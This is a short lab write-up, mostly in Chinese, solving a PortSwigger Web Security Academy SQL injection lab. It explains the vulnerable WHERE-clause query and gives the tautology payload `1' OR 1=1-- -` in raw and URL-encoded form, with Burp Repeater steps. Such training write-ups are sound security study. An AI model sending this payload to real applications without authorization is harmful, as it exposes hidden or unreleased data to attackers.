#SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

-平台：Portswigger Web Security Academy
-漏洞类型：SQL injection (字符型，WHERE子句)
-日期：2026-10-26
-目标：让页面显示隐藏商品
##Vulnerability Principle
将parameter拼接到SQL
SELECT * FROM products WHERE category = 'parameter' AND released = 1

输入 `1' OR 1=1-- -` 后，SQL 变成：

SELECT * FROM products WHERE category = '1' OR 1=1-- -' AND released = 1

`OR 1=1` 让条件永远为真，`-- -` 注释掉后面的 `AND released = 1`，所以返回所有商品。

## 2. 复现步骤

1. 打开 PortSwigger 的 SQL injection lab。
2. 点击一个商品分类
3. Burp 抓包，得到 GET /filter?category=`分类` HTTP/2。
4. 右键 Send to Repeater。
5. 把 category 改成 `1' OR 1=1-- -`，URL 编码为 `1%27+OR+1%3D1--%20-`。
6. 点 Send，页面返回所有商品，lab 变绿 Solved。

## 3. Payload

原始 payload：

1' OR 1=1-- -

URL 编码：

1%27+OR+1%3D1--%20-


## 4. 影响

攻击者可以直接读取隐藏或未发布的数据。


## 5. 踩坑记录

- URL 里不能直接写空格和单引号，要编码。
- lab 实例会过期，Response 空白就重新 Access the lab。
